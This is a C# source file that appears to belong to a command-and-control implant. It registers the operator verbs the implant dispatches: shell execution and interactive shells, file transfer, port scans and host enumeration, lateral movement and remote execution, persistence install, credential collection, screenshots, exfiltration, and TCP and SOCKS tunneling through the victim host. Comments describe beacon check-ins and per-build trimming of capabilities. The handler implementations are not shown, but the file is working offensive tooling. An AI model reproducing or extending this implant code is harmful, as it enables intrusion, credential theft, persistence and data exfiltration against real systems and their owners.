using Rod.V1;

namespace Rod.Implant.Internal;

// The reference handler registrations (architecture.md Sec 5.3): the one
// compiled handler per standard-category verb the reference implant
// implements, in registration order. This checked-in file registers them all
// so the dev tree runs the full set from flags/env; the bake replaces it with
// a generated selection naming only the handlers the build class's verb set
// keeps, and deletes the unused handler sources from the compilation whole --
// the same replace-a-stub trim TransportSelection applies to the check-in
// clients. HandlerRegistry.Default builds its lists from here, so the beacon
// loop wires whatever selection the artifact carries without an edit.

internal static class HandlerSelection
{
    /// <summary>
    /// The one-shot reference registrations in registration order: the
    /// core baseline (shell, file push/pull) plus the recon, lateral,
    /// persist, collect, and exfil sets (architecture.md Sec 10.1), the
    /// lateral.move handler carrying the <paramref name="enroll"/> bundle
    /// when child derivation is enabled, and beacon.sleep carrying the live
    /// <paramref name="cadence"/> so an operator can retune a fielded
    /// implant's check-in interval. The channel verbs also register a
    /// one-shot fallback so the verb stays dispatchable everywhere the
    /// registry is used: a path with no channel to carry it (a poll cycle,
    /// a future transport without streams) fails cleanly at the verb
    /// instead of losing it.
    /// </summary>
    public static IReadOnlyList<ICapabilityHandler> Handlers(EnrollBundle? enroll, Cadence? cadence = null) =>
    [
        new CapabilityHandler("shell.exec", args => Core.ShellExec(args)),
        new CapabilityHandler("shell.interact", _ =>
            (TaskOutcome.Failed, "shell.interact runs as a live channel; this dispatch path does not carry one")),
        new CapabilityHandler("beacon.sleep", args => BeaconSleep.Set(args, cadence)),
        new CapabilityHandler("tunnel.forward", _ =>
            (TaskOutcome.Failed, "tunnel.forward runs as a live channel; this dispatch path does not carry one")),
        new CapabilityHandler("tunnel.socks", _ =>
            (TaskOutcome.Failed, "tunnel.socks runs as a live channel; this dispatch path does not carry one")),
        new CapabilityHandler("file.push", args => Files.Push(args)),
        new CapabilityHandler("file.pull", args => Files.Pull(args)),
        new CapabilityHandler("fs.list", args => Files.List(args)),
        new CapabilityHandler("proc.kill", args => Proc.Kill(args)),
        new CapabilityHandler("recon.portscan", args => Core.PortScan(args)),
        new CapabilityHandler("recon.hostenum", args => Core.HostEnum(args)),
        new CapabilityHandler("recon.service", args => Core.ServiceProbe(args)),
        new CapabilityHandler("recon.ps", args => Proc.List(args)),
        new CapabilityHandler("lateral.move", args => Lateral.Move(args, enroll)),
        new CapabilityHandler("lateral.token", args => Lateral.Token(args)),
        new CapabilityHandler("lateral.exec_remote", args => Lateral.ExecRemote(args)),
        new CapabilityHandler("persist.install", args => Persist.Install(args)),
        new CapabilityHandler("persist.remove", args => Persist.Remove(args)),
        new CapabilityHandler("persist.list", args => Persist.List(args)),
        new CapabilityHandler("collect.cred", args => Collect.Cred(args)),
        new CapabilityHandler("collect.screenshot", args => Collect.Screenshot(args)),
        new CapabilityHandler("exfil.push", args => Exfil.Push(args)),
        new CapabilityHandler("exfil.stage", args => Exfil.Stage(args)),
    ];

    /// <summary>
    /// The staged registrations (architecture.md Sec 10, the typed arm):
    /// file.push is the verb whose grammar outgrew the arguments string --
    /// its bulk payload arrives as the chunk run the beacon loop demands.
    /// </summary>
    public static IReadOnlyList<(string Verb, Func<string, byte[], (TaskOutcome Outcome, string Output)> Handle)> Staged =>
    [
        ("file.push", (args, data) => Files.PushStaged(args, data)),
    ];

    /// <summary>
    /// The channel registrations (architecture.md Sec 10.3, the streaming
    /// task shape): shell.interact is shell.exec's live-channel shape, and
    /// the tunnel verbs bridge the channel to TCP connections of the
    /// implant's own -- tunnel.forward one connection, tunnel.socks the
    /// connection-multiplexed proxy (architecture.md Sec 5.2, Sec 14).
    /// </summary>
    public static IReadOnlyList<CapabilityChannelHandler> Channels =>
    [
        new("shell.interact", (args, stream, ct) => InteractiveShell.RunAsync(args, stream, ct)),
        new("tunnel.forward", (args, stream, ct) => TunnelForward.RunAsync(args, stream, ct)),
        new("tunnel.socks", (args, stream, ct) => TunnelSocks.RunAsync(args, stream, ct)),
    ];
}
